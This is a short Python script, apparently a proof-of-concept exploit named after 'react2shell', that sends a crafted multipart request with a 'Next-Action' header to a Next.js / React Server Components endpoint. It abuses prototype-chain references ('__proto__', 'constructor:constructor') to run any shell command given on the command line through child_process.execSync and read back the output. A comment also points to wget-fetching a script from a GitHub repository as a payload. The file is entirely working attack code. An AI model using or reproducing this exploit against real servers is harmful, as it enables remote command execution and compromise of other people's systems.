import requests
import json
import sys

# BASE_URL = "http://localhost:3000"
BASE_URL = sys.argv[1]

# wget https://raw.githubusercontent.com/rrojan/react2shell-exploration/main/exploit/very-safe-script.sh
EXECUTABLE = sys.argv[2]
# EXECUTABLE = "whoami"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
# print(res.status_code)
print(res.text)
